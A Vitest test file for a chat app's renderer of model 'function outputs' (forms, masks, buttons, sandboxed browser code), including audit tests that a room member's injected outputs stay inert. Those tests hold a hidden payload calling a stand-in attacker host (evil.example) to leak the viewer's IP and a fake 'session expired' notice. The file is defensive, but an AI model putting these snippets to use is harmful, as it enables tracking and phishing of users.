// Function outputs in the app (5.3): the shared rules (what an output is, a
// form's checks, masks, what a room message may carry) and the renderer —
// every item of a list shown on its own, a broken one reported without taking
// the others down, buttons and forms reaching the model's entry points, browser
// code in an opaque-origin sandbox.

import { describe, it, expect, afterEach, vi } from "vitest";
import { render, cleanup, fireEvent, waitFor, act } from "@testing-library/react";
import { applyMask, maskPlaceholder, checkFnOutput, checkFormValues, outputsToMarkdown, sanitizeFnOutputs, shareableOutputs, type FnOutput } from "../client/src/lib/fn-outputs";
import { FnHostContext, FnOutputs, groupOutputs, PEER_JS_EVENTS, type FnHost } from "../client/src/components/fn/FnOutputs";
import { MessageBubble } from "../client/src/components/MessageBubble";
import { validatePayload } from "../client/src/lib/validate";
import { SANDBOX_CSP, SANDBOX_HTML } from "../server/functions/sandbox-page";

// /fn-sandbox.html is not served here: happy-dom gets an empty page for the frame
// instead of a failed fetch logged at teardown.
type Interceptor = { beforeAsyncRequest: (c: { request: Request }) => Promise<Response | void> };
const happyDOM = (window as unknown as { happyDOM?: { settings: { fetch: { interceptor: Interceptor | null } } } }).happyDOM;
if (happyDOM) happyDOM.settings.fetch.interceptor = { beforeAsyncRequest: async ({ request }) => (new URL(request.url).pathname === "/fn-sandbox.html" ? new Response("<!doctype html><title>sandbox</title>", { headers: { "Content-Type": "text/html" } }) : undefined) };

afterEach(() => cleanup());

const host = (over: Partial<FnHost> = {}): FnHost => ({ lang: "en", event: vi.fn(async () => true), report: vi.fn(), flash: vi.fn(), openWindow: vi.fn(() => true), tone: () => "light", ...over });
const meta = { keyword: "demo", name: "Demo", model: "demo-m", chain: "chn_abc123def", call: 0, events: ["button", "form", "response", "error"] };

describe("the output rules", () => {
  it("checks each type and says why an item is not an output", () => {
    expect(checkFnOutput({ type: "button", name: "go", title: "Go", css: "primary evil-class", style: { color: "red", background: "url(x)" } })).toEqual({ ok: true, output: { type: "button", name: "go", title: "Go", css: "primary", style: { color: "red" } } });
    expect(checkFnOutput({ type: "button", title: "no name" })).toEqual({ ok: false, reason: expect.stringMatching(/needs a name/) });
    expect(checkFnOutput({ type: "audio", mime: "audio/wav", data: "UklGRg==" }).ok).toBe(true);
    expect(checkFnOutput({ type: "audio", mime: "text/html", data: "AAAA" })).toMatchObject({ ok: false });
    expect(checkFnOutput({ type: "js", code: "" })).toMatchObject({ ok: false });
    expect(checkFnOutput({ type: "nope" })).toMatchObject({ ok: false, reason: expect.stringMatching(/unknown output type/) });
    const form = checkFnOutput({ type: "form", name: "f", panels: [{ layout: "columns", columns: 9, fields: [{ name: "a", type: "masked", mask: "000" }, { name: "bad name!", type: "text" }, { name: "s", type: "multiselect", options: ["x", { value: "y", label: "Y", icon: "🍎" }] }] }] });
    expect(form).toMatchObject({ ok: true, output: { panels: [{ columns: 4, fields: [{ name: "a" }, { name: "s", options: [{ value: "x" }, { value: "y", icon: "🍎" }] }] }] } });
  });

  it("form values: required, e-mail, numbers, masks", () => {
    const spec = { name: "f", fields: [{ name: "e", type: "email" as const, required: true }, { name: "n", type: "number" as const, min: 2 }, { name: "p", type: "masked" as const, mask: "000 000" }] };
    expect(checkFormValues(spec, { e: "", n: 1, p: "12" })).toEqual({ e: "required", n: "min 2", p: "incomplete" });
    expect(checkFormValues(spec, { e: "a@b.cz", n: 3, p: "123 456" })).toEqual({});
    expect(applyMask("+{420} 000 000 000", "777123456")).toBe("+420 777 123 456");
    expect(applyMask("+{420} 000 000 000", "+420 777 123 456")).toBe("+420 777 123 456");
    expect(applyMask("+\\4\\2\\0 000", "123")).toBe("+420 123");
    expect(applyMask("aa-0000", "ab1234")).toBe("ab-1234");
    expect(maskPlaceholder("+{420} 000 000 000")).toBe("+420 ___ ___ ___");
  });

  it("a room message carries what fits; peers' outputs are checked again", () => {
    const big: FnOutput = { type: "image", mime: "image/png", data: "A".repeat(800_000) };
    const shared = shareableOutputs([{ type: "text", text: "hi" }, big]);
    expect(shared[1]).toEqual({ type: "text", text: "(image — too large to share in the room)" });
    expect(sanitizeFnOutputs([{ type: "text", text: "ok" }, { type: "js", code: 5 }, { type: "flash", text: "x", level: "boom" }])).toEqual([{ type: "text", text: "ok" }, { type: "flash", text: "x", level: "info" }]);
    const p = validatePayload({ id: "m1", senderId: "p2", senderName: "A", text: "x", flags: { fn: { keyword: "demo", name: "Demo", chain: "chn_abc123def", call: 3, events: ["button", "hack"], outputs: [{ type: "button", name: "go", title: "Go" }] } } }, { transportSender: "p2", myId: "me" });
    expect((p as { flags: { fn: unknown } }).flags.fn).toEqual({ keyword: "demo", name: "Demo", chain: "chn_abc123def", call: 3, events: ["button"], outputs: [{ type: "button", name: "go", title: "Go" }] });
    expect(outputsToMarkdown([{ type: "button", name: "b", title: "Buy", icon: "🛒" }, { type: "js", code: "x" }])).toBe("[🛒 Buy]");
  });
});

describe("the renderer", () => {
  const show = (outputs: FnOutput[], h: FnHost, m: Record<string, unknown> | undefined = meta, fresh = true) =>
    render(<FnHostContext.Provider value={h}><FnOutputs outputs={outputs} meta={m as never} fresh={fresh} /></FnHostContext.Provider>);

  it("shows every item of a list; buttons side by side form one row", () => {
    const outs: FnOutput[] = [
      { type: "markdown", text: "# Title" }, { type: "table", columns: ["a"], rows: [[1]] },
      { type: "button", name: "a", title: "A" }, { type: "button", name: "b", title: "B" }, { type: "text", text: "end" },
    ];
    expect(groupOutputs(outs).map((i) => i.kind)).toEqual(["one", "one", "buttons", "one"]);
    const r = show(outs, host());
    expect(r.container.querySelector("h3")?.textContent).toBe("Title");
    expect(r.container.querySelectorAll(".fn-buttons button")).toHaveLength(2);
    expect(r.getByText("end")).toBeTruthy();
  });

  it("a click calls the button entry point with its name and data", async () => {
    const h = host();
    const r = show([{ type: "button", name: "more", title: "More", data: { n: 2 }, once: true }], h);
    fireEvent.click(r.getByText("More"));
    await waitFor(() => expect(h.event).toHaveBeenCalledWith(meta, { type: "button", name: "more", data: { n: 2 } }));
    await waitFor(() => expect((r.getByText("More").closest("button") as HTMLButtonElement).disabled).toBe(true)); // once
  });

  it("a button asks first when it has confirm; without a session it is disabled", async () => {
    const h = host();
    const r = show([{ type: "button", name: "del", title: "Delete", confirm: "Really?" }], h);
    fireEvent.click(r.getByText("Delete"));
    expect(h.event).not.toHaveBeenCalled();
    fireEvent.click(r.getByText("Really?"));
    await waitFor(() => expect(h.event).toHaveBeenCalled());
    cleanup();
    const r2 = show([{ type: "button", name: "x", title: "X" }], host(), { keyword: "k", name: "K" });
    expect((r2.getByText("X").closest("button") as HTMLButtonElement).disabled).toBe(true);
  });

  it("a form checks its values, then calls the form entry point", async () => {
    const h = host();
    const r = show([{ type: "form", name: "ask", title: "Ask", submit: "Go", labels: "left", panels: [{ title: "You", layout: "columns", columns: 2, fields: [
      { name: "email", type: "email", label: "E-mail", required: true },
      { name: "phone", type: "masked", mask: "000 000 000", label: "Phone" },
      { name: "tier", type: "select", label: "Tier", options: [{ value: "a", label: "Gold", icon: "🥇" }, { value: "b", label: "Silver", icon: "🥈" }], default: "b" },
      { name: "agree", type: "switch", label: "Agree" },
    ] }] }], h);
    fireEvent.click(r.getByText("Go"));
    expect(await r.findByText("Required")).toBeTruthy();
    expect(h.event).not.toHaveBeenCalled();
    fireEvent.change(r.getByLabelText(/E-mail/), { target: { value: "a@b.cz" } });
    fireEvent.change(r.getByLabelText("Phone"), { target: { value: "777123456" } });
    expect((r.getByLabelText("Phone") as HTMLInputElement).value).toBe("777 123 456");
    expect(r.getByText("Silver")).toBeTruthy(); // the default, with its icon
    fireEvent.click(r.getByText("Silver"));
    fireEvent.mouseDown(r.getByText("Gold"));
    fireEvent.click(r.getByRole("switch"));
    fireEvent.click(r.getByText("Go"));
    await waitFor(() => expect(h.event).toHaveBeenCalledWith(meta, { type: "form", name: "ask", values: { email: "a@b.cz", phone: "777 123 456", tier: "a", agree: true } }));
  });

  it("a notice flashes once when the message is new; a panel opens", () => {
    const h = host();
    show([{ type: "flash", text: "Saved", level: "success" }, { type: "window", id: "files", args: null }], h);
    expect(h.flash).toHaveBeenCalledWith("Saved", "success");
    expect(h.openWindow).toHaveBeenCalledWith("files", null);
    cleanup();
    const h2 = host();
    show([{ type: "flash", text: "Old", level: "info" }], h2, meta, false);
    expect(h2.flash).not.toHaveBeenCalled();
  });

  it("a broken item is reported (the error entry point may answer) and the rest still shows", async () => {
    const h = host({ openWindow: () => false });
    const r = show([{ type: "text", text: "before" }, { type: "window", id: "nowhere", args: null }, { type: "text", text: "after" }], h);
    expect(r.getByText("before")).toBeTruthy();
    expect(r.getByText("after")).toBeTruthy();
    await waitFor(() => expect(h.report).toHaveBeenCalledWith(meta, expect.objectContaining({ type: "error", output: 1, error: expect.objectContaining({ message: expect.stringMatching(/no panel "nowhere"/) }) })));
  });

  it("browser code runs in an opaque-origin sandbox frame", () => {
    const r = show([{ type: "js", code: "m5.flash('hi')", args: { a: 1 }, title: "Widget" }], host());
    const frame = r.container.querySelector("iframe")!;
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts"); // no allow-same-origin
    expect(frame.getAttribute("src")).toBe("/fn-sandbox.html");
    // Hidden code is an effect: shown in an old message, it does not run again.
    cleanup();
    const r2 = show([{ type: "js", code: "x()", hidden: true }], host(), meta, false);
    expect(r2.container.querySelector("iframe")).toBeNull();
  });

  it("messages from the frame reach the model — only from that frame, and within a budget", async () => {
    const h = host();
    const r = show([{ type: "js", code: "m5.send('pick', { id: 1 })" }], h);
    const frame = r.container.querySelector("iframe")!;
    await act(async () => {
      window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "send", name: "pick", data: { id: 1 } }, source: window })); // not the frame: ignored
      window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "send", name: "pick", data: { id: 1 } }, source: frame.contentWindow }));
      window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "flash", text: "yo", level: "success" }, source: frame.contentWindow }));
    });
    expect(h.event).toHaveBeenCalledTimes(1);
    expect(h.event).toHaveBeenCalledWith(meta, { type: "button", name: "pick", data: { id: 1 }, source: "js" });
    expect(h.flash).toHaveBeenCalledWith("yo", "success");
  });
});

describe("the sandbox page", () => {
  it("has an opaque origin even on its own, and allows only what the code needs", () => {
    expect(SANDBOX_CSP).toMatch(/sandbox allow-scripts/);
    expect(SANDBOX_CSP).not.toMatch(/allow-same-origin/);
    expect(SANDBOX_CSP).toMatch(/frame-ancestors 'self'/);
    expect(SANDBOX_CSP).toMatch(/default-src 'none'/);
    expect(SANDBOX_HTML).toContain("e.source !== parentWin");
    expect(SANDBOX_HTML).toContain('new Function("m5", "args"');
  });
});

// 6.7 (audit V2): a room member wrote "outputs" into a message of their own —
// the audit's payload: hidden browser code that phones home, a notice that looks
// like the app's, autoplaying sound, a panel. Nothing of it may act by itself.
describe("outputs in another member's message (6.7, V2)", () => {
  const mallory = { name: "Mallory" };
  const showPeer = (outputs: FnOutput[], h: FnHost, m: Record<string, unknown> | undefined = meta) =>
    render(<FnHostContext.Provider value={h}><FnOutputs outputs={outputs} meta={m as never} fresh from={mallory} /></FnHostContext.Provider>);
  const setActivation = (isActive: boolean | null) => {
    if (isActive === null) { delete (navigator as unknown as { userActivation?: unknown }).userActivation; return; }
    Object.defineProperty(navigator, "userActivation", { configurable: true, get: () => ({ isActive, hasBeenActive: isActive }) });
  };
  afterEach(() => setActivation(null));

  it("a peer's payload survives validation — so the renderer is what keeps it inert", () => {
    const p = validatePayload({ id: "m9", senderId: "p-mal", senderName: "Mallory", text: "hi", flags: { fn: { keyword: "help", name: "Help", chain: "chn_abcdef", outputs: [{ type: "js", code: "fetch('https://evil.example/?ip')", hidden: true }, { type: "flash", text: "Your session expired", level: "error" }] } } }, { transportSender: "p-mal", myId: "me" });
    expect((p as { flags: { fn: { outputs: unknown[] } } }).flags.fn.outputs).toHaveLength(2);
  });

  it("hidden browser code from a peer never runs, even in a new message", () => {
    const r = showPeer([{ type: "js", code: "fetch('https://evil.example/?ip')", hidden: true }], host());
    expect(r.container.querySelector("iframe")).toBeNull();
    expect(r.getByTestId("fn-peer-hidden").textContent).toMatch(/Mallory/);
  });

  it("visible browser code waits for the viewer's click, naming the sender", () => {
    const r = showPeer([{ type: "js", code: "m5.send('x')", title: "Game" }], host());
    expect(r.container.querySelector("iframe")).toBeNull();
    expect(r.getByTestId("fn-peer-code").textContent).toMatch(/Run browser code from Mallory\?/);
    fireEvent.click(r.getByTestId("fn-peer-run"));
    const frame = r.container.querySelector("iframe")!;
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
    expect(r.getByTestId("fn-peer-started").textContent).toMatch(/Browser code from Mallory/);
  });

  it("notices, panels and sounds of a peer wait for the viewer — none fires by itself", () => {
    const h = host();
    const play = vi.spyOn(HTMLMediaElement.prototype, "play").mockResolvedValue(undefined);
    const r = showPeer([{ type: "flash", text: "Your session expired", level: "error" }, { type: "window", id: "files", args: null }, { type: "audio", mime: "audio/wav", data: "UklGRg==", autoplay: true, loop: true }], h);
    expect(h.flash).not.toHaveBeenCalled();
    expect(h.openWindow).not.toHaveBeenCalled();
    expect(play).not.toHaveBeenCalled();
    expect(r.getByText("Your session expired")).toBeTruthy(); // shown in the bubble, as the member's text
    play.mockRestore();
  });

  it("once started, its code reaches the model only while the viewer is active, and only so often; its notices carry the sender", async () => {
    const h = host();
    const r = showPeer([{ type: "js", code: "for(;;) m5.send('x')" }], h);
    fireEvent.click(r.getByTestId("fn-peer-run"));
    const frame = r.container.querySelector("iframe")!;
    const send = () => window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "send", name: "x", data: null }, source: frame.contentWindow }));
    setActivation(false);
    await act(async () => { send(); });
    expect(h.event).not.toHaveBeenCalled(); // nobody is using it: not in the viewer's name
    setActivation(true);
    await act(async () => { for (let i = 0; i < PEER_JS_EVENTS + 10; i++) send(); });
    expect(h.event).toHaveBeenCalledTimes(PEER_JS_EVENTS);
    await act(async () => { window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "flash", text: "Saved", level: "success" }, source: frame.contentWindow })); });
    expect(h.flash).toHaveBeenCalledWith("Mallory: Saved", "success");
  });

  it("a peer's broken output is logged, but the error entry point does not run in the viewer's name", async () => {
    const h = host();
    showPeer([{ type: "image", mime: "image/png", data: "AAAA" }], h);
    const img = document.querySelector("img.fn-image")!;
    fireEvent.error(img);
    await waitFor(() => expect(h.report).toHaveBeenCalledWith(meta, expect.objectContaining({ type: "error", fromError: true })));
  });

  it("the bubble: outputs in my own message act, the same outputs in a member's message wait", () => {
    const flags = { fn: { keyword: "demo", name: "Demo", chain: "chn_abc123def", outputs: [{ type: "js" as const, code: "x()" }] } };
    const bubble = (mine: boolean, senderId: string) => render(
      <MessageBubble id={`b-${senderId}`} senderId={senderId} senderName={mine ? "Me" : "Mallory"} mine={mine} isSystem={false} secure createdAt={Date.now()} timeLabel=""
        text="(browser code)" flags={flags} onVanish={() => undefined} lang="en" renderText={(t) => <span>{t}</span>} formatSize={(n) => `${n} B`} badge={null} />,
    );
    const theirs = bubble(false, "p-mal");
    expect(theirs.container.querySelector("iframe")).toBeNull();
    expect(theirs.getByTestId("fn-peer-code")).toBeTruthy();
    cleanup();
    expect(bubble(true, "p-me").container.querySelector("iframe")).not.toBeNull();
    cleanup();
    expect(bubble(false, "function:demo").container.querySelector("iframe")).not.toBeNull(); // a caller-only answer, made here
  });

  it("a peer cannot take an id reserved for this app's own answers", () => {
    expect(validatePayload({ id: "m1", senderId: "function:demo", senderName: "Demo", text: "x" }, { transportSender: "function:demo", myId: "me" })).toBeNull();
  });
});
